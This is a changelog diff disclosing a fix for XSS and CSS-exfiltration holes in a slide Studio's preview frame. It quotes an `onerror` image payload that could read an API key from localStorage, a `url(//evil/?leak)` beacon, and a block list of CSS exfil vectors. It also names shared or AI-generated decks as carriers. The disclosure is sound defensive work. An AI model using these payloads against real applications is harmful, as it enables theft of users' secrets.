@@ -25,6 +25,26 @@ in patch versions.
 
 ## Unreleased
 
+### Security
+
+- **Untrusted-content XSS + CSS exfil hardened in the Studio preview (#616, #610).** Two
+  surfaces were exploitable *today*, before any transformer change, now that components
+  and decks are shareable + AI-generable: (1) engine-rendered slide HTML (markdown with
+  `html: true`, no sanitizer) was written into a same-origin, un-sandboxed `srcdoc`
+  preview frame, so a shared/AI deck or component skeleton carrying `<img src=x
+  onerror=…>` executed in the app origin and could read the OpenRouter key from
+  `localStorage`; (2) the local-component CSS gate blocked only scope/hex, not `@import`
+  / remote `url()` / `expression()` — a live `background:url(//evil/?leak)` beacon and
+  attribute-leak exfil channel. **Fix:** a single upstream `sanitizeSlideHtml`
+  (`docs/src/lib/sanitize-slide-html.js`, DOMPurify) now runs at every preview-frame
+  builder — stripping scripts, event handlers, and dangerous URLs while preserving
+  legitimate chart SVG, MathML, tables, and inline-`style` `url()` backgrounds — and
+  `findCssExfil` (`lib/layout/gate.js`) blocks `@import` / remote `url()` /
+  `expression()` / `-moz-binding` / `javascript:` in component CSS (inline `data:` and
+  `#fragment` refs stay allowed). Sanitizing is a no-op on legitimate decks, so no
+  exported artifact's bytes change. Closes the §5.1 preconditions in the
+  component-transformer threat model.
+
 ### Added
 
 - **Theme Studio — AI delivers a full, AA-verified palette (#610).** The Theme Studio's
